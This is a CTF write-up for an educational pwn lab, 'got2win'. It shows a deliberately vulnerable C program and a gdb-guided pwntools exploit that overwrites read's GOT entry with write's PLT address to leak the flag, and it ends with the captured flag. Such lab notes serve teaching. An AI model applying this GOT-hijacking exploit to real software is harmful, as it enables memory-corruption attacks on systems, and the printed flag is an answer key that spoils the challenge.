# Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)
###### tags: `CTF` `PWN` `eductf`

challenge: `nc edu-ctf.zoolab.org 10004`
## GOT Background
[Lecture Vid. - Pwn week1](https://youtu.be/ktoVQB99Gj4?t=4423)
[NTUSTISC - Pwn Basic 2 [2019.03.19]](https://youtu.be/PBgHHWtjtFA?t=6017)

## Original Code
:::spoiler Original Code
```cpp!=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

char flag[0x30];

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    int fd = open("/home/chal/flag", O_RDONLY);
    read(fd, flag, 0x30);
    close(fd);
    write(1, "Good luck !\n", 13);

    unsigned long addr = 0;
    printf("Overwrite addr: ");
    scanf("%lu", &addr);
    printf("Overwrite 8 bytes value: ");
    read(0, (void *) addr, 0x8);

    printf("Give me fake flag: ");
    int nr = read(1, flag, 0x30);
    if (nr <= 0)
        exit(1);
    flag[nr - 1] = '\0';
    printf("This is your flag: ctf{%s}... Just kidding :)\n", flag);

    return 0;
}
```
:::
* The program read the flag first at line `13~16`
* At line `19~22`, it allow user input an address and its value
* At line `25`, you may think it's weird that it use `stdout` as `read` function's parameter.
* In addition, it doesn't have buffer overflow, so that we can not use the technique before to get flag.
* Thus, our perspective is we can <font color="FF0000">overlap the `read GOT` by `write plt`</font>, so that it can execute write function:
`int nr=write(1, flag, 0x30);`
## Exploit
* First, we should find the address of `read GOT` and `write plt`
    ```bash!
    gdb chal
    b *main()
    ni    # Until write function
    si
    ```
    ![reference link](https://imgur.com/LFfc5fS.png)
* Then we wanna know `read GOT` address
![](https://imgur.com/hygnwEQ.png)
* My exploit is:
    ```python!
    from pwn import *

    context.arch = 'amd64'

    r=remote('edu-ctf.zoolab.org', 10004)
    context.terminal = ['tmux', 'splitw', '-h']

    read_got = 0x404038
    write_plt = 0x4010c0

    r.sendlineafter('Overwrite addr: ', str(read_got))
    r.sendafter('Overwrite 8 bytes value: ', p64(write_plt))

    r.interactive()
    ```
    Then, we can use `read` function as `write` function to get flag  <font color="FF0000">`FLAG{apple_1f3870be274f6c49b3e31a0c6728957f}`</font>

## Reference
[PWN week1](https://youtu.be/ktoVQB99Gj4)